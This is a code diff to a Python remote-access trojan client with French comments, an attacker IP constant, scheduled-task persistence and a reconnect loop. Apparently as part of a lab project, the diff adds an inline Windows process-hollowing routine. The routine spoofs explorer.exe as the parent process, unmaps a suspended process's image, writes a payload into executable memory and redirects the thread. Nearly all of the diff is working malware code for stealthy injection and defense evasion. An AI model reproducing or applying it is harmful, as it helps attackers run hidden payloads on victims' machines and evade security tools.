@@ -5,7 +5,9 @@ import os
 import time
 import random
 import getpass
-from ctypes import cdll, c_char_p, c_int
+import struct
+from ctypes import *
+from ctypes.wintypes import *
 
 
 ATTACKER_IP = "192.168.56.102"
@@ -14,6 +16,13 @@ BUFFER_SIZE = 4096
 RECONNECT_DELAY = 5 
 SIMULATE_DELAY = True
 SIMULATE_STARTUP_DELAY = random.uniform(1, 5) 
+
+ntdll = windll.ntdll
+kernel32 = windll.kernel32
+
+# Définitions
+PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
+EXTENDED_STARTUPINFO_PRESENT = 0x00080000
 
 def debug_print(message):
 
@@ -87,20 +96,115 @@ def shedule_task_for_user():
     except Exception as e:
         print(f"[-] Exception : {e}")
 
-def hollowing():
-    dll = cdll.LoadLibrary("hollowing.dll")
-    dll.Hollowing.argtypes = [c_char_p, c_char_p]
-    dll.Hollowing.restype = c_int
+class STARTUPINFOEX(Structure):
+    _fields_ = [("StartupInfo", STARTUPINFOA),
+                ("lpAttributeList", LPVOID)]
 
-    target = b"C:\\Windows\\System32\\notepad.exe"
-    current_dir = os.path.dirname(os.path.abspath(__file__))
-    payload_path = os.path.join(current_dir, "dist", "rat_client.exe").encode('utf-8')
+class PROCESS_INFORMATION(Structure):
+    _fields_ = [("hProcess", HANDLE),
+                ("hThread", HANDLE),
+                ("dwProcessId", DWORD),
+                ("dwThreadId", DWORD)]
 
-    result = dll.Hollowing(c_char_p(target), c_char_p(payload_path))
-    if result == 0:
-        print("✅ Hollowing réussi")
+def get_explorer_pid():
+    hwnd = windll.user32.FindWindowA(b"Shell_TrayWnd", None)
+    pid = DWORD()
+    windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
+    return pid.value
+
+def read_file(path):
+    with open(path, "rb") as f:
+        return f.read()
+
+def create_suspended_process(target, parent_pid):
+    size = SIZE_T()
+    # 1. Crée une liste d'attributs vide pour savoir la taille requise
+    windll.kernel32.InitializeProcThreadAttributeList(None, 1, 0, byref(size))
+
+    # 2. Alloue la mémoire pour la vraie liste
+    attr_list = windll.kernel32.HeapAlloc(windll.kernel32.GetProcessHeap(), 0, size.value)
+
+    # 3. Initialise
+    windll.kernel32.InitializeProcThreadAttributeList(attr_list, 1, 0, byref(size))
+
+    # 4. Ouvre le parent
+    hParent = windll.kernel32.OpenProcess(0x00100000 | 0x0400 | 0x0010, False, parent_pid)
+
+    # 5. Ajoute l’attribut parent
+    windll.kernel32.UpdateProcThreadAttribute(attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                              byref(c_void_p(hParent)), sizeof(c_void_p), None, None)
+
+    si = STARTUPINFOEX()
+    si.StartupInfo.cb = sizeof(si)
+    si.lpAttributeList = attr_list
+    pi = PROCESS_INFORMATION()
+
+    success = windll.kernel32.CreateProcessA(
+        target.encode('utf-8'),
+        None,
+        None,
+        None,
+        False,
+        EXTENDED_STARTUPINFO_PRESENT | 0x4,  # CREATE_SUSPENDED
+        None,
+        None,
+        byref(si),
+        byref(pi)
+    )
+
+    windll.kernel32.DeleteProcThreadAttributeList(attr_list)
+    windll.kernel32.CloseHandle(hParent)
+
+    if not success:
+        return None, None
+    return pi.hProcess, pi.hThread
+
+def get_image_base_address(hThread):
+    ctx = (ctypes.c_char * 1232)()
+    struct.pack_into("I", ctx, 0, 0x10007)  # CONTEXT_FULL
+    if not windll.kernel32.GetThreadContext(hThread, ctx):
+        return None
+    # Rdx (x64) est à offset 0x98 dans CONTEXT
+    return struct.unpack_from("Q", ctx, 0x98)[0]
+
+def inject_and_resume(hProcess, hThread, payload):
+    base_address = get_image_base_address(hThread)
+    if not base_address:
+        return False
+
+    # NtUnmapViewOfSection
+    NtUnmapViewOfSection = ntdll.NtUnmapViewOfSection
+    NtUnmapViewOfSection.argtypes = [HANDLE, PVOID]
+    NtUnmapViewOfSection.restype = DWORD
+    NtUnmapViewOfSection(hProcess, base_address)
+
+    remote_mem = windll.kernel32.VirtualAllocEx(hProcess, base_address, len(payload), 0x3000, 0x40)
+    written = DWORD(0)
+    windll.kernel32.WriteProcessMemory(hProcess, remote_mem, payload, len(payload), byref(written))
+
+    # Modifier le contexte pour faire pointer RIP à la nouvelle base
+    ctx = (ctypes.c_char * 1232)()
+    struct.pack_into("I", ctx, 0, 0x10007)
+    windll.kernel32.GetThreadContext(hThread, ctx)
+    struct.pack_into("Q", ctx, 0x88, remote_mem)  # RCX
+    windll.kernel32.SetThreadContext(hThread, ctx)
+
+    windll.kernel32.ResumeThread(hThread)
+    return True
+
+def perform_hollowing(target_path, payload_path):
+    payload = read_file(payload_path)
+    ppid = get_explorer_pid()
+    hProcess, hThread = create_suspended_process(target_path, ppid)
+    if not hProcess:
+        print("❌ Failed to create process")
+        return
+    if inject_and_resume(hProcess, hThread, payload):
+        print("✅ Hollowing succeeded")
     else:
-        print(f"❌ Hollowing échoué, code erreur {result}")
+        print("❌ Hollowing failed")
+    windll.kernel32.CloseHandle(hThread)
+    windll.kernel32.CloseHandle(hProcess)
 
 
 def main():
@@ -111,7 +215,6 @@ def main():
         time.sleep(SIMULATE_STARTUP_DELAY)
 
     shedule_task_for_user()
-    hollowing()
     sock = None
     try:
         while True:
